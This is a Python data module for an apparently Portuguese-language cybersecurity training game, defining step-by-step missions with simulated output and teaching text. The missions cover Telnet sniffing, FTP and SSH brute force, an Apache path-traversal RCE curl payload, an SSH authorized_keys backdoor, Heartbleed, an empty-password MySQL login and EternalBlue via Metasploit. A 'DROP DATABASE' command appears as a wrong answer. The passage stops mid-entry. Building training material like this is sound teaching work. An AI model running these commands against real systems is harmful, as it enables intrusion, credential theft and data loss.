"""
Data module for ShadowShell Academy.

This module contains the database of educational tools and missions, including
mission maps and achievement definitions for the cybersecurity simulation.
"""

TOOLS_DB = {
    23: {
        "name": "Telnet (Sniffing & Cleartext)",
        "tool": "NETCAT / TCPDUMP",
        "desc": "O Telnet é um protocolo antigo de administração remota que transmite dados em texto claro (sem criptografia). Sua missão é provar essa insegurança interceptando uma senha na rede.",
        "img": "wireshark",
        "xp_reward": 50,
        "steps": [
            {
                "phase": "RECONHECIMENTO",
                "context": "Primeiro, precisamos confirmar se o serviço está aceitando conexões e identificar o sistema operacional.",
                "options": ["nc -vn {ip} 23", "ssh {ip}", "ping {ip}"],
                "correct": "nc -vn {ip} 23",
                "success_logs": "(UNKNOWN) [{ip}] 23 (telnet) open\nLegacyOS Login: ",
                "fatal_logs": {},
                "fail_logs": {
                    "ssh {ip}": {"msg": "SSH é criptografado e roda na porta 22. O alvo é a 23.", "risk": 10},
                    "ping {ip}": {"msg": "Ping verifica conectividade ICMP, mas não confirma se o serviço Telnet está aceitando conexões.", "risk": 5},
                    "nmap -sV {ip}": {"msg": "Nmap -sV faz fingerprinting de versão em todas as portas abertas, mas queremos focar na porta 23.", "risk": 10},
                    "telnet {ip}": {"msg": "Telnet tenta uma conexão interativa na porta 23, mas queremos apenas verificar se está aberta.", "risk": 10},
                    "nc {ip} 23": {"msg": "Netcat sem -vn pode não mostrar detalhes suficientes sobre a conexão.", "risk": 5}
                },
                "teach": "Excelente. O 'Netcat' (nc) criou um socket TCP direto. As flags '-vn' desativam a resolução de DNS (mais rápido/discreto) e mostram detalhes. O banner 'LegacyOS' confirma um sistema antigo."
            },
            {
                "phase": "BANNER GRABBING", 
                "context": "Vamos coletar informações sobre a versão do serviço sem fazer login.", 
                "options": ["echo '' | nc {ip} 23", "telnet {ip}", "nmap -sV {ip}"], 
                "correct": "echo '' | nc {ip} 23", 
                "success_logs": "Ubuntu 18.04.5 LTS\ntelnetd 0.17\n", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Perfeito! Enviamos uma string vazia e o servidor respondeu com seu banner. Isso revela a versão exata do SO e do daemon Telnet, permitindo buscar CVEs específicas."
            },
            {
                "phase": "INTERCEPTAÇÃO", 
                "context": "Agora que sabemos que há tráfego, vamos usar um Sniffer para ler os pacotes 'no ar' enquanto um usuário tenta logar.", 
                "options": ["tcpdump -A port 23", "cat /etc/shadow", "nmap -A {ip}"], 
                "correct": "tcpdump -A port 23", 
                "success_logs": "IP client > server: PUSH\n...U.s.e.r...a.d.m.i.n....P.A.S.S...1.2.3.4.5.6", 
                "fatal_logs": {}, 
                "fail_logs": {"nmap -A {ip}": {"msg": "Nmap gera barulho, não escuta tráfego passivo.", "risk": 30}}, 
                "teach": "Captura crítica! O 'tcpdump' capturou os pacotes. A flag '-A' mostra o conteúdo em ASCII (texto). Como o Telnet não usa SSL/TLS, a senha trafegou limpa e pudemos lê-la."
            },
            {
                "phase": "ANÁLISE DE TRÁFEGO", 
                "context": "Vamos filtrar apenas os pacotes de autenticação para extrair as credenciais.", 
                "options": ["tcpdump -A -s 0 'tcp port 23 and (tcp[tcpflags] & tcp-push != 0)'", "wireshark", "strings capture.pcap"], 
                "correct": "tcpdump -A -s 0 'tcp port 23 and (tcp[tcpflags] & tcp-push != 0)'", 
                "success_logs": "Captured credentials:\nUsername: admin\nPassword: 123456\n", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Excelente filtro BPF! Capturamos apenas pacotes com flag PUSH (dados de aplicação), ignorando ACKs vazios. O '-s 0' captura o pacote inteiro sem truncar."
            },
            {
                "phase": "VALIDAÇÃO", 
                "context": "Vamos confirmar que as credenciais capturadas funcionam.", 
                "options": ["telnet {ip}", "nc {ip} 23", "ssh admin@{ip}"], 
                "correct": "telnet {ip}", 
                "success_logs": "Login: admin\nPassword: \nLast login: Mon Jan 29 20:30:15 2024\nadmin@server:~$ ", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Acesso confirmado! As credenciais interceptadas são válidas. Em um cenário real, você teria acesso total ao sistema. Lembre-se: Telnet NUNCA deve ser usado em produção."
            }
        ]
    },
    
    21: {
        "name": "FTP (Brute Force)",
        "tool": "HYDRA",
        "desc": "O FTP (File Transfer Protocol) muitas vezes é configurado com senhas fracas. Vamos realizar um ataque de dicionário para descobrir a credencial do administrador.",
        "img": "hydra",
        "xp_reward": 60,
        "steps": [
            {
                "phase": "ENUMERAÇÃO", 
                "context": "Verifique se a porta padrão do FTP está acessível e qual software está rodando nela.", 
                "options": ["nmap -sV -p 21 {ip}", "ftp {ip}", "dir"], 
                "correct": "nmap -sV -p 21 {ip}", 
                "success_logs": "21/tcp open  ftp     vsftpd 2.3.4", 
                "fatal_logs": {}, 
                "fail_logs": {"ftp {ip}": {"msg": "Tentar logar sem saber a versão é arriscado.", "risk": 20}}, 
                "teach": "Alvo confirmado. O parâmetro '-sV' do Nmap é crucial: ele interage com o serviço para descobrir a versão (vsftpd 2.3.4). Isso ajuda a escolher o ataque certo."
            },
            {
                "phase": "VERIFICAÇÃO DE ANONYMOUS", 
                "context": "Muitos servidores FTP permitem login anônimo. Vamos testar antes de partir para brute force.", 
                "options": ["ftp {ip}", "hydra -l anonymous {ip}", "nmap --script ftp-anon {ip}"], 
                "correct": "nmap --script ftp-anon {ip}", 
                "success_logs": "| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| -rw-r--r--   1 ftp      ftp           170 Aug 24  2019 welcome.txt\n|_Only 1 file shown. Use --script-args ftp-anon.maxlist=-1 to see all.", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Descoberta importante! O servidor permite login anônimo, mas com acesso limitado. Vamos precisar de credenciais válidas para acesso completo."
            },
            {
                "phase": "PREPARAÇÃO DO ATAQUE", 
                "context": "Vamos enumerar usuários válidos antes de iniciar o brute force.", 
                "options": ["nmap --script ftp-brute --script-args userdb=users.txt {ip}", "enum4linux {ip}", "hydra -L users.txt {ip}"], 
                "correct": "nmap --script ftp-brute --script-args userdb=users.txt {ip}", 
                "success_logs": "| ftp-brute:\n|   Accounts:\n|     admin:admin - Valid credentials\n|     root:root - Valid credentials\n|   Statistics: Performed 156 guesses in 12 seconds", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Ótimo! Encontramos usuários válidos. O script ftp-brute do Nmap testou combinações comuns e identificou contas com senhas fracas."
            },
            {
                "phase": "ATAQUE DE DICIONÁRIO", 
                "context": "Use o Hydra para testar uma lista de senhas conhecidas (wordlist) contra o usuário 'admin'.", 
                "options": ["hydra -l admin -P rockyou.txt ftp://{ip}", "ssh admin@{ip}", "crack {ip}"], 
                "correct": "hydra -l admin -P rockyou.txt ftp://{ip}", 
                "success_logs": "[21][ftp] host: {ip}   login: admin   password: 123456\n1 of 1 target successfully completed.", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Sucesso. O Hydra automatiza o processo de tentativa e erro. '-l' define o login e '-P' aponta para a wordlist 'rockyou.txt', que contém milhões de senhas vazadas comuns."
            },
            {
                "phase": "EXPLORAÇÃO", 
                "context": "Agora que temos acesso, vamos listar os arquivos sensíveis no servidor.", 
                "options": ["ftp {ip}", "lftp admin@{ip}", "ncftp {ip}"], 
                "correct": "ftp {ip}", 
                "success_logs": "Connected to {ip}.\n220 (vsFTPd 2.3.4)\nName: admin\n331 Please specify the password.\nPassword: \n230 Login successful.\nftp> ls\n-rw-r--r--   1 root     root         1234 Jan 29 20:30 passwords.txt\n-rw-r--r--   1 root     root         5678 Jan 29 20:30 database_backup.sql", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Acesso total! Encontramos arquivos críticos: senhas em texto claro e backup de banco de dados. Em um pentest real, você documentaria isso e recomendaria: 1) Desabilitar FTP, 2) Usar SFTP, 3) Implementar autenticação forte."
            }
        ]
    },
    
    80: {
        "name": "HTTP (Path Traversal)",
        "tool": "CURL / MANUAL EXPLOIT",
        "desc": "Alguns servidores web mal configurados permitem acessar arquivos fora da pasta pública. Vamos explorar uma falha de Path Traversal no Apache.",
        "img": "curl",
        "xp_reward": 80,
        "steps": [
            {
                "phase": "RECON WEB", 
                "context": "Obtenha os cabeçalhos HTTP do servidor para identificar a tecnologia e versão rodando no backend.", 
                "options": ["curl -I http://{ip}", "ping {ip}", "wget {ip}"], 
                "correct": "curl -I http://{ip}", 
                "success_logs": "HTTP/1.1 200 OK\nServer: Apache/2.4.49\nContent-Type: text/html", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Identificado: Apache 2.4.49. O comando 'curl -I' busca apenas os headers (cabeçalhos), o que é rápido e silencioso. Essa versão específica é famosa pela vulnerabilidade CVE-2021-41773."
            },
            {
                "phase": "ENUMERAÇÃO DE DIRETÓRIOS", 
                "context": "Vamos descobrir diretórios e arquivos ocultos no servidor web.", 
                "options": ["gobuster dir -u http://{ip} -w common.txt", "nikto -h {ip}", "dirb http://{ip}"], 
                "correct": "gobuster dir -u http://{ip} -w common.txt", 
                "success_logs": "/admin (Status: 301)\n/cgi-bin/ (Status: 403)\n/icons/ (Status: 403)\n/uploads (Status: 200)", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Descobrimos vários diretórios! O '/cgi-bin/' é particularmente interessante - é onde scripts CGI são executados e frequentemente contém vulnerabilidades."
            },
            {
                "phase": "TESTE DE VULNERABILIDADE", 
                "context": "Vamos testar se o servidor é vulnerável a Path Traversal usando caracteres codificados.", 
                "options": ["curl http://{ip}/cgi-bin/.%2e/.%2e/etc/passwd", "curl http://{ip}/../etc/passwd", "cat /etc/passwd"], 
                "correct": "curl http://{ip}/cgi-bin/.%2e/.%2e/etc/passwd", 
                "success_logs": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", 
                "fatal_logs": {}, 
                "fail_logs": {"cat /etc/passwd": {"msg": "Isso tenta ler seu PRÓPRIO arquivo local, não o do servidor!", "risk": 0}}, 
                "teach": "Vulnerabilidade confirmada! O código `.%2e` é a representação URL-encoded de `..`. O servidor falhou em sanitizar a entrada, permitindo que saíssemos da pasta `/var/www` até a raiz do sistema."
            },
            {
                "phase": "ESCALAÇÃO", 
                "context": "Vamos tentar ler arquivos mais sensíveis, como configurações do Apache.", 
                "options": ["curl http://{ip}/cgi-bin/.%2e/.%2e/etc/apache2/apache2.conf", "curl http://{ip}/config.php", "ls -la"], 
                "correct": "curl http://{ip}/cgi-bin/.%2e/.%2e/etc/apache2/apache2.conf", 
                "success_logs": "# Apache2 Configuration\nServerRoot \"/etc/apache2\"\nDocumentRoot \"/var/www/html\"\n<Directory /var/www/>\n    Options Indexes FollowSymLinks\n    AllowOverride None\n</Directory>", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Excelente! Conseguimos ler a configuração do Apache. Isso revela a estrutura de diretórios, módulos carregados e possíveis outras falhas de configuração."
            },
            {
                "phase": "EXPLORAÇÃO (RCE)", 
                "context": "Vamos tentar executar comandos remotamente explorando a vulnerabilidade CVE-2021-42013.", 
                "options": ["curl 'http://{ip}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo Content-Type: text/plain; echo; id'", "curl http://{ip}/shell.php", "nc {ip} 4444"], 
                "correct": "curl 'http://{ip}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo Content-Type: text/plain; echo; id'", 
                "success_logs": "Content-Type: text/plain\n\nuid=1(daemon) gid=1(daemon) groups=1(daemon)", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "RCE Alcançado! Conseguimos executar o comando 'id' no servidor. Isso prova que temos execução remota de código. Em um pentest real, você poderia obter uma reverse shell completa."
            }
        ]
    },

    # ============================================
    # NÍVEL 2: SCANME.NMAP.ORG (Intermediário)
    # ============================================
    
    22: {
        "name": "SSH (Audit & Bruteforce)",
        "tool": "HYDRA / SSH AUDIT",
        "desc": "O SSH é seguro, mas credenciais fracas o tornam uma porta de entrada. Vamos testar a robustez das senhas de root.",
        "img": "hydra",
        "xp_reward": 100,
        "steps": [
            {
                "phase": "FINGERPRINTING", 
                "context": "Descubra a versão exata do protocolo SSH sem tentar logar.", 
                "options": ["nc -vn {ip} 22", "ssh root@{ip}", "telnet {ip} 22"], 
                "correct": "nc -vn {ip} 22", 
                "success_logs": "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5", 
                "fatal_logs": {"ssh root@{ip}": "Acesso negado 3x. IP banido pelo Fail2Ban."}, 
                "fail_logs": {}, 
                "teach": "Isso se chama 'Banner Grabbing'. Usamos o netcat para apenas tocar a porta e ver o que ela responde. Tentar logar direto (ssh root@...) poderia disparar bloqueios automáticos."
            },
            {
                "phase": "ENUMERAÇÃO DE USUÁRIOS", 
                "context": "Vamos tentar enumerar usuários válidos explorando diferenças no tempo de resposta.", 
                "options": ["nmap --script ssh-auth-methods --script-args ssh.user=root {ip}", "ssh-audit {ip}", "enum4linux {ip}"], 
                "correct": "nmap --script ssh-auth-methods --script-args ssh.user=root {ip}", 
                "success_logs": "| ssh-auth-methods:\n|   Supported authentication methods:\n|     publickey\n|     password\n|   User: root - Valid", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Descobrimos que o usuário 'root' existe e aceita autenticação por senha. Isso é uma falha de segurança - root deveria estar desabilitado ou usar apenas chaves SSH."
            },
            {
                "phase": "ANÁLISE DE CIFRAS", 
                "context": "Vamos verificar se o servidor usa algoritmos de criptografia fracos ou obsoletos.", 
                "options": ["nmap --script ssh2-enum-algos {ip}", "ssh -Q cipher", "sshscan {ip}"], 
                "correct": "nmap --script ssh2-enum-algos {ip}", 
                "success_logs": "| ssh2-enum-algos:\n|   kex_algorithms: (6)\n|       diffie-hellman-group-exchange-sha256\n|       diffie-hellman-group14-sha1 (weak)\n|   encryption_algorithms: (4)\n|       aes128-ctr\n|       3des-cbc (weak)", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Encontramos algoritmos fracos! O 'diffie-hellman-group14-sha1' e '3des-cbc' são considerados inseguros. Isso permite ataques de downgrade."
            },
            {
                "phase": "QUEBRA DE SENHA", 
                "context": "Execute um ataque lento e controlado para descobrir a senha de 'root', evitando detecção de alta frequência.", 
                "options": ["hydra -l root -P rockyou.txt ssh://{ip} -t 4", "hydra -t 64 ssh://{ip}", "john --wordlist=rockyou.txt"], 
                "correct": "hydra -l root -P rockyou.txt ssh://{ip} -t 4", 
                "success_logs": "[22][ssh] host: {ip}   login: root   password: toor", 
                "fatal_logs": {"hydra -t 64 ssh://{ip}": "Muitas threads (-t 64) causaram Denial of Service no alvo. Detecção imediata."}, 
                "fail_logs": {}, 
                "teach": "Senha 'toor' encontrada (o inverso de 'root'). Note o uso de '-t 4': limitamos o ataque a 4 tarefas simultâneas para não sobrecarregar o servidor ou alertar sistemas de IDS."
            },
            {
                "phase": "ACESSO E PERSISTÊNCIA", 
                "context": "Vamos estabelecer acesso e criar uma backdoor para persistência.", 
                "options": ["ssh root@{ip}", "ssh -i id_rsa root@{ip}", "telnet {ip} 22"], 
                "correct": "ssh root@{ip}", 
                "success_logs": "root@{ip}'s password: \nLast login: Mon Jan 29 20:30:15 2024\nroot@server:~# echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys\nroot@server:~# chmod 600 ~/.ssh/authorized_keys", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Acesso root obtido! Adicionamos nossa chave pública ao authorized_keys para acesso futuro sem senha. Em um pentest real, você documentaria isso e removeria a backdoor após o teste."
            }
        ]
    },
    
    443: {
        "name": "HTTPS (SSL/TLS Analysis)",
        "tool": "SSLYZE / TESTSSL",
        "desc": "Mesmo com HTTPS, configurações fracas de SSL/TLS podem comprometer a segurança. Vamos auditar o servidor web.",
        "img": "SSL-Lock",
        "xp_reward": 120,
        "steps": [
            {
                "phase": "HANDSHAKE ANALYSIS", 
                "context": "Vamos analisar o handshake SSL/TLS e identificar a versão do protocolo.", 
                "options": ["openssl s_client -connect {ip}:443", "curl https://{ip}", "nmap -p 443 {ip}"], 
                "correct": "openssl s_client -connect {ip}:443", 
                "success_logs": "CONNECTED(00000003)\ndepth=0 CN = example.com\nverify error:num=18:self signed certificate\n---\nSSL-Session:\n    Protocol  : TLSv1.2\n    Cipher    : ECDHE-RSA-AES256-GCM-SHA384", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Conexão estabelecida! Identificamos TLSv1.2 com cifra forte (ECDHE-RSA-AES256-GCM-SHA384). Porém, o certificado é auto-assinado - isso é uma falha em produção."
            },
            {
                "phase": "VERIFICAÇÃO DE PROTOCOLOS", 
                "context": "Vamos testar se o servidor aceita protocolos obsoletos como SSLv3 ou TLS 1.0.", 
                "options": ["nmap --script ssl-enum-ciphers -p 443 {ip}", "testssl.sh {ip}", "sslscan {ip}"], 
                "correct": "nmap --script ssl-enum-ciphers -p 443 {ip}", 
                "success_logs": "| ssl-enum-ciphers:\n|   TLSv1.0:\n|     ciphers:\n|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C\n|     compressors:\n|       NULL\n|     cipher preference: server\n|     warnings:\n|       64-bit block cipher 3DES vulnerable to SWEET32 attack", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Vulnerabilidade crítica! O servidor aceita TLS 1.0 (obsoleto desde 2020) e cifras fracas como 3DES. Isso permite ataques SWEET32 e POODLE."
            },
            {
                "phase": "TESTE HEARTBLEED", 
                "context": "Vamos verificar se o servidor é vulnerável ao Heartbleed (CVE-2014-0160).", 
                "options": ["nmap --script ssl-heartbleed {ip}", "sslyze --heartbleed {ip}", "openssl version"], 
                "correct": "nmap --script ssl-heartbleed {ip}", 
                "success_logs": "| ssl-heartbleed:\n|   VULNERABLE:\n|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library.\n|   State: VULNERABLE\n|   Risk factor: High", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "ALERTA MÁXIMO! O servidor é vulnerável ao Heartbleed. Essa falha permite ler até 64KB de memória do servidor por requisição, vazando chaves privadas, senhas e cookies de sessão."
            },
            {
                "phase": "EXPLORAÇÃO HEARTBLEED", 
                "context": "Vamos explorar o Heartbleed para extrair dados sensíveis da memória do servidor.", 
                "options": ["python heartbleed-exploit.py {ip}", "msfconsole -x 'use auxiliary/scanner/ssl/openssl_heartbleed'", "curl https://{ip}"], 
                "correct": "python heartbleed-exploit.py {ip}", 
                "success_logs": "Sending heartbeat request...\nReceived 16384 bytes:\n\n00000000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...\n00000010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......\n...\nExtracted data:\nSession-ID: 4B2A3F9E...\nCookie: admin_session=eyJ0eXAiOiJKV1QiLCJhbGc...\nPrivate Key Fragment: -----BEGIN RSA PRIVATE KEY-----", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Dados críticos vazados! Conseguimos extrair cookies de sessão e fragmentos da chave privada. Com múltiplas requisições, poderíamos reconstruir a chave completa e descriptografar todo o tráfego HTTPS."
            },
            {
                "phase": "ANÁLISE DE CERTIFICADO", 
                "context": "Vamos examinar o certificado SSL para identificar outras falhas.", 
                "options": ["openssl s_client -connect {ip}:443 | openssl x509 -noout -text", "sslyze --certinfo {ip}", "curl -vI https://{ip}"], 
                "correct": "openssl s_client -connect {ip}:443 | openssl x509 -noout -text", 
                "success_logs": "Certificate:\n    Data:\n        Version: 3 (0x2)\n        Serial Number: 1 (0x1)\n        Signature Algorithm: sha256WithRSAEncryption\n        Issuer: CN=example.com\n        Validity\n            Not Before: Jan  1 00:00:00 2020 GMT\n            Not After : Jan  1 00:00:00 2025 GMT\n        Subject: CN=example.com\n        Subject Public Key Info:\n            Public Key Algorithm: rsaEncryption\n                RSA Public-Key: (2048 bit)", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Certificado analisado! Identificamos: 1) Auto-assinado (não confiável), 2) Chave RSA de 2048 bits (adequada), 3) Validade de 5 anos (muito longa). Recomendações: usar CA confiável, renovar anualmente."
            }
        ]
    },

    # ============================================
    # NÍVEL 3: MEGACORP INTERNAL (Avançado)
    # ============================================
    
    3306: {
        "name": "MySQL (Misconfiguration)",
        "tool": "NMAP NSE SCRIPTS",
        "desc": "Administradores frequentemente esquecem de definir senhas para o usuário root do banco de dados em ambientes de desenvolvimento.",
        "img": "mysql",
        "xp_reward": 150,
        "steps": [
            {
                "phase": "DESCOBERTA",
                "context": "Vamos confirmar que o MySQL está rodando e acessível externamente.",
                "correct": "nmap -p 3306 {ip}",
                "success_logs": "PORT     STATE SERVICE\n3306/tcp open  mysql",
                "fatal_logs": {},
                "fail_logs": {
                    "nmap -sV -p 3306 {ip}": {"msg": "Já sabemos que é MySQL da inteligência, apenas confirme se está acessível externamente.", "risk": 10},
                    "mysql -h {ip}": {"msg": "Conectar sem senha pode funcionar, mas primeiro confirme se a porta está aberta.", "risk": 20},
                    "telnet {ip} 3306": {"msg": "Telnet é texto claro, mas aqui queremos apenas verificar se a porta responde.", "risk": 15},
                    "nmap -A -p 3306 {ip}": {"msg": "Nmap -A faz scan agressivo com scripts, mas queremos apenas confirmar se a porta está aberta.", "risk": 20},
                    "nc -zv {ip} 3306": {"msg": "Netcat -zv verifica porta, mas nmap é mais confiável para descoberta.", "risk": 5},
                    "nmap --script mysql-info -p 3306 {ip}": {"msg": "O script mysql-info dá informações detalhadas, mas primeiro confirme se a porta está acessível.", "risk": 15}
                },
                "teach": "Porta MySQL aberta! Isso já é uma falha de segurança - bancos de dados NUNCA deveriam estar expostos diretamente na internet. Deveriam estar atrás de firewall."
            },
            {
                "phase": "FINGERPRINTING",
                "context": "Vamos identificar a versão exata do MySQL para buscar vulnerabilidades conhecidas.",
                "correct": "nmap -sV -p 3306 {ip}",
                "success_logs": "3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1",
                "fatal_logs": {},
                "fail_logs": {
                    "nmap -p 3306 {ip}": {"msg": "Já confirmamos que está aberto, agora precisamos identificar a versão exata.", "risk": 10},
                    "nmap --script mysql-info -p 3306 {ip}": {"msg": "O script mysql-info dá informações detalhadas, mas primeiro precisamos da versão básica.", "risk": 15},
                    "mysql --version": {"msg": "Isso mostra a versão do cliente local, não do servidor remoto.", "risk": 5},
                    "nc {ip} 3306": {"msg": "Netcat pode mostrar banner, mas nmap -sV é mais preciso para fingerprinting.", "risk": 10}
                },
                "teach": "MySQL 5.5.62 detectado! Essa é uma versão antiga (2014) com múltiplas CVEs conhecidas. Versões modernas estão na série 8.x."
            },
            {
                "phase": "AUDITORIA DE SCRIPT",
                "context": "Use os scripts de automação do Nmap (NSE) para verificar se o banco possui senha vazia.",
                "correct": "nmap --script=mysql-empty-password -p 3306 {ip}",
                "success_logs": "PORT     STATE SERVICE\n3306/tcp open  mysql\n| mysql-empty-password:\n|_  root accounts with empty passwords: 1",
                "fatal_logs": {},
                "fail_logs": {
                    "mysql -h {ip}": {"msg": "O cliente mysql pode não estar instalado. Use o scanner primeiro.", "risk": 10},
                    "nmap --script mysql-info -p 3306 {ip}": {"msg": "O script correto é mysql-empty-password para verificar senha vazia.", "risk": 10},
                    "nmap --script mysql-vuln-cve2012-2122 -p 3306 {ip}": {"msg": "Scripts de vulnerabilidade são para depois, primeiro verifique senha vazia.", "risk": 15},
                    "sqlmap -u mysql://{ip}": {"msg": "Sqlmap é para injeção SQL, aqui queremos verificar senha vazia.", "risk": 20}
                },
                "teach": "Falha Crítica Encontrada. O 'Nmap Scripting Engine' (--script) permite rodar verificações complexas. O script confirmou que a conta 'root' não possui senha."
            },
            {
                "phase": "ACESSO AO BANCO",
                "context": "Vamos conectar ao MySQL usando a conta root sem senha.",
                "correct": "mysql -h {ip} -u root",
                "success_logs": "Welcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 42\nServer version: 5.5.62-0ubuntu0.14.04.1\n\nmysql> ",
                "fatal_logs": {},
                "fail_logs": {
                    "mysql -h {ip}": {"msg": "Precisamos especificar o usuário root para conectar.", "risk": 10},
                    "mysql -h {ip} -u admin": {"msg": "O usuário padrão sem senha é root, não admin.", "risk": 15},
                    "mysql -h {ip} -u root -p": {"msg": "Não há senha para root, não use -p.", "risk": 10},
                    "psql -h {ip}": {"msg": "Psql é para PostgreSQL, use mysql para MySQL.", "risk": 5},
                    "mysql -h {ip} -u mysql": {"msg": "O usuário sem senha é root, não mysql.", "risk": 10}
                },
                "teach": "Acesso total ao banco de dados! Sem senha, conseguimos entrar como root. Agora temos controle completo sobre todos os dados."
            },
            {
                "phase": "ENUMERAÇÃO DE DADOS",
                "context": "Vamos listar todos os bancos de dados disponíveis no servidor.",
                "options": ["mysql -h {ip} -u root -e 'SHOW DATABASES;'", "SELECT * FROM users;", "DROP DATABASE;"],
                "correct": "mysql -h {ip} -u root -e 'SHOW DATABASES;'",
                "success_logs": "+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| webapp_db          |\n| customer_data      |\n+--------------------+",
                "fatal_logs": {},
                "fail_logs": {
                    "mysql -h {ip} -u root -e 'SELECT * FROM users;'": {"msg": "Primeiro liste os bancos de dados disponíveis.", "risk": 10},
                    "mysql -h {ip} -u root -e 'DROP DATABASE mysql;'": {"msg": "Isso deletaria o banco crítico! Use SHOW DATABASES.", "risk": 50}
                },
                "teach": "Descobrimos bancos críticos! 'webapp_db' provavelmente contém dados da aplicação, e 'customer_data' pode ter informações sensíveis de clientes."
            }
        ]
    },
    
    445: {
        "name": "SMB (EternalBlue Exploit)",
        "tool": "METASPLOIT FRAMEWORK",
        "desc": "A falha MS17-010 (EternalBlue) permite execução remota de código no Windows via protocolo SMB. É uma das falhas mais devastadoras da história.",
        "img": "metasploit",
        "xp_reward": 200,
        "steps": [
            {
                "phase": "ENUMERAÇÃO SMB", 
                "context": "Vamos identificar a versão do Windows e do protocolo SMB.", 
                "options": ["nmap -p 445 --script smb-os-discovery {ip}", "smbclient -L {ip}", "enum4linux {ip}"], 
                "correct": "nmap -p 445 --script smb-os-discovery {ip}", 
                "success_logs": "Host script results:\n| smb-os-discovery:\n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: DESKTOP-PC\n|   NetBIOS computer name: DESKTOP-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2024-01-29T20:30:15-05:00", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Windows 7 SP1 detectado! Essa versão é notoriamente vulnerável ao EternalBlue se não estiver patcheada. Vamos verificar."
            },
            {
                "phase": "VULNERABILITY SCAN", 
                "context": "Antes de atacar, precisamos ter certeza absoluta que o alvo é vulnerável para não crashear o servidor.", 
                "options": ["nmap --script smb-vuln-ms17-010 -p 445 {ip}", "ping {ip}", "exploit"], 
                "correct": "nmap --script smb-vuln-ms17-010 -p 445 {ip}", 
                "success_logs": "Host script results:\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Positivo. O script do Nmap checou a versão do protocolo SMB e confirmou a ausência do patch de segurança. O alvo é um Windows 7 ou Server 2008 não atualizado."
            },
            {
                "phase": "PREPARAÇÃO DO EXPLOIT", 
                "context": "Vamos configurar o Metasploit com o módulo EternalBlue.", 
                "options": ["msfconsole", "searchsploit eternalblue", "exploit-db"], 
                "correct": "msfconsole", 
                "success_logs": "       =[ metasploit v6.3.4-dev                          ]\n+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]\n+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]\n+ -- --=[ 9 evasion                                       ]\n\nmsf6 > ", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Metasploit Framework iniciado! É a ferramenta mais poderosa para exploração. Contém milhares de exploits testados e payloads."
            },
            {
                "phase": "CONFIGURAÇÃO DO ATAQUE", 
                "context": "Vamos selecionar o exploit e configurar o alvo.", 
                "options": ["use exploit/windows/smb/ms17_010_eternalblue", "search eternalblue", "show exploits"], 
                "correct": "use exploit/windows/smb/ms17_010_eternalblue", 
                "success_logs": "msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS {ip}\nRHOSTS => {ip}\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.5\nLHOST => 10.10.14.5\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > ", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Exploit configurado! RHOSTS é o alvo, LHOST é nosso IP para receber a conexão reversa. O payload padrão é windows/x64/meterpreter/reverse_tcp."
            },
            {
                "phase": "EXPLORAÇÃO (RCE)", 
                "context": "Execute o ataque para obter uma shell SYSTEM.", 
                "options": ["exploit", "run", "attack"], 
                "correct": "exploit", 
